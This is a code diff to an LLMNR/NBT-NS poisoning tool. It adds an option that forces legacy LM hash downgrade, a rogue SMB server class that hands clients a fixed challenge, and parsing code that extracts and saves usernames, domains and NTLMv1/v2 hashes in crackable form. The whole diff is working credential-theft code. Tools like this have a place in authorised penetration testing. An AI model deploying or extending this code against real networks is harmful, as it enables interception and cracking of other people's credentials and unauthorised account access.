@@ -51,6 +51,8 @@ parser.add_option('-D','--dns', action="store", dest="DNS_On_Off", help = "Set t
 
 parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is On", metavar="On", choices=['On','Off'], default="On")
 
+parser.add_option('--lm',action="store", help="Set this to 1 if you want to force LM hashing downgrade for Windows <= 5.2. Default value is False (0)", metavar="0",dest="LM_On_Off", choices=['0','1'], default="0")
+
 options, args = parser.parse_args()
 
 if options.OURIP is None:
@@ -79,6 +81,7 @@ LDAP_On_Off = options.LDAP_On_Off.upper()
 Finger_On_Off = options.Finger.upper()
 DNS_On_Off = options.DNS_On_Off.upper()
 WPAD_On_Off = options.WPAD_On_Off.upper()
+LM_On_Off = options.LM_On_Off.upper()
 Wredirect = options.Wredirect
 NumChal = options.optChal
 
@@ -100,7 +103,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nSMB Server is:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\n"%(NumChal,WPAD_On_Off,On_Off,SMB_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off))
+Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\n"%(NumChal,WPAD_On_Off,On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -251,6 +254,13 @@ def Is_Anonymous(data):
        else:
           return False
 
+def Is_LMNT_Anonymous(data):
+    LMhashLen = struct.unpack('<H',data[51:53])[0]
+    if LMhashLen == 0 or LMhashLen == 1:
+       return True
+    else:
+       return False
+
 #Function used to know which dialect number to return for NT LM 0.12
 def Parse_Nego_Dialect(data):
     DialectStart = data[40:]
@@ -288,6 +298,7 @@ def ParseShare(data):
        print quote.replace('\x00','')
        logging.warning(quote.replace('\x00',''))
 
+#Parse SMB NTLMSSP v1/v2 
 def ParseSMBHash(data,client):
     SecBlobLen = struct.unpack('<H',data[51:53])[0]
     BccLen = struct.unpack('<H',data[61:63])[0]
@@ -300,7 +311,7 @@ def ParseSMBHash(data,client):
        NthashOffset = struct.unpack('<H',data[99:101])[0]
 
     if SecBlobLen > 220:
-       SSPIStart = data[79:]#LenOfLen set for ASN...
+       SSPIStart = data[79:]
        LMhashLen = struct.unpack('<H',data[93:95])[0]
        LMhashOffset = struct.unpack('<H',data[95:97])[0]
        LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
@@ -341,8 +352,55 @@ def ParseSMBHash(data,client):
        print "[+]SMB complete hash is :", writehash
        logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))
 
+#Parse SMB NTLMv1/v2 
+def ParseLMNTHash(data,client):
+  try:
+    lenght = struct.unpack('<H',data[43:45])[0]
+    LMhashLen = struct.unpack('<H',data[51:53])[0]
+    NthashLen = struct.unpack('<H',data[53:55])[0]
+    Bcc = struct.unpack('<H',data[63:65])[0]
+    if NthashLen > 25:
+       Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
+       logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
+       print "[+]SMB-NTLMv2 hash captured from :",client
+       outfile = "SMB-NTLMv2-Client-"+client+".txt"
+       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
+       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
+       Username, Domain = tuple(var)
+       Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
+       WriteData(outfile,Writehash)
+       print "[+]SMB-NTLMv2 complete hash is :",Writehash
+       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
+       print "Username : ",Username
+       logging.warning('[+]SMB-NTLMv2 Username:%s'%(Username))
+       print "Domain (if joined, if not then computer name) : ",Domain
+       logging.warning('[+]SMB-NTLMv2 Domain (if joined, if not then computer name) :%s'%(Domain))
+    if NthashLen == 24:
+       print "[+]SMB-NTLMv1 hash captured from : ",client
+       logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
+       outfile = "SMB-NTLMv1-Client-"+client+".txt"
+       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
+       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
+       Username, Domain = tuple(var)
+       writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
+       WriteData(outfile,writehash)
+       print "[+]SMB complete hash is :", writehash
+       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
+       print "Username : ",Username
+       logging.warning('[+]SMB-NTLMv1 Username:%s'%(Username))
+       print "Domain (if joined, if not then computer name) : ",Domain
+       logging.warning('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
+    packet = data[:]
+    a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
+    if a:
+       quote = "Share requested: "+a.group(0)
+       print quote.replace('\x00','')
+       logging.warning(quote.replace('\x00',''))
+  except Exception:
+           raise
+
 def IsNT4ClearTxt(data):
-    HeadLen = 36 #32 + nbnss(4)
+    HeadLen = 36 
     Flag2 = data[14:16]
     if Flag2 == "\x03\x80":
        SmbData = data[HeadLen+14:]
@@ -356,7 +414,7 @@ def IsNT4ClearTxt(data):
              print "[SMB]Clear Text Credentials: %s:%s" %(User,Password) 
              logging.warning("[SMB]Clear Text Credentials: %s:%s"%(User,Password))
 
-#SMB Server class.
+#SMB Server class, NTLMSSP
 class SMB1(SocketServer.BaseRequestHandler):
     def server_bind(self):
        self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
@@ -368,7 +426,7 @@ class SMB1(SocketServer.BaseRequestHandler):
         try:
            while True:
               data = self.request.recv(1024)
-              self.request.settimeout(2)
+              self.request.settimeout(1)
               ##session request 139
               if data[0] == "\x81":
                 buffer0 = "\x82\x00\x00\x00"         
@@ -458,6 +516,51 @@ class SMB1(SocketServer.BaseRequestHandler):
 
         except Exception:
            pass #no need to print errors..
+
+#SMB Server class, old version.
+class SMB1LM(SocketServer.BaseRequestHandler):
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+       self.socket.setblocking(0)
+       self.socket.setdefaulttimeout(0.5)
+
+    def handle(self):
+        try:
+           self.request.settimeout(0.5)
+           data = self.request.recv(1024)
+           ##session request 139
+           if data[0] == "\x81":
+              buffer0 = "\x82\x00\x00\x00"         
+              self.request.send(buffer0)
+              data = self.request.recv(1024)
+              ##Negotiate proto answer.
+           if data[8:10] == "\x72\x00":
+              head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),mid=midcalc(data))
+              t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
+              t.calculate()
+              packet1 = str(head)+str(t)
+              buffer1 = longueur(packet1)+packet1  
+              self.request.send(buffer1)
+              data = self.request.recv(1024)
+              ##Session Setup AndX Request
+           if data[8:10] == "\x73\x00":
+              if Is_LMNT_Anonymous(data):
+                 head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                 packet1 = str(head)+str(SMBSessEmpty())
+                 buffer1 = longueur(packet1)+packet1  
+                 self.request.send(buffer1)
+              else:
+                 ParseLMNTHash(data,self.client_address[0])
+                 head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                 packet1 = str(head)+str(SMBSessEmpty())
+                 buffer1 = longueur(packet1)+packet1  
+                 self.request.send(buffer1)
+                 data = self.request.recv(1024)
+
+        except Exception:
+           pass #no need to print errors..
+           self.request.close()
 
 ##################################################################################
 #SQL Stuff
@@ -682,6 +785,7 @@ class DNS(SocketServer.BaseRequestHandler):
 #HTTP Stuff
 ##################################################################################
 from HTTPPackets import *
+from HTTPProxy import *
 
 #Parse NTLMv1/v2 hash.
 def ParseHTTPHash(data,client):
@@ -821,7 +925,6 @@ class HTTP(SocketServer.BaseRequestHandler):
 ##################################################################################
 #HTTP Proxy Stuff
 ##################################################################################
-from HTTPProxy import *
 
 def GrabHost(data,host):
     Host = re.findall('(?<=GET )[^HTTP]*', data)
@@ -1065,7 +1168,10 @@ def Is_WPAD_On(on_off):
 #Function name self-explanatory
 def Is_SMB_On(SMB_On_Off):
     if SMB_On_Off == "ON":
-       return thread.start_new(serve_thread_tcp, ('', 445,SMB1)),thread.start_new(serve_thread_tcp,('', 139,SMB1))
+       if LM_On_Off == "1":
+          return thread.start_new(serve_thread_tcp, ('', 445,SMB1LM)),thread.start_new(serve_thread_tcp,('', 139,SMB1LM))
+       else:
+          return thread.start_new(serve_thread_tcp, ('', 445,SMB1)),thread.start_new(serve_thread_tcp,('', 139,SMB1))
     if SMB_On_Off == "OFF":
        return False
 
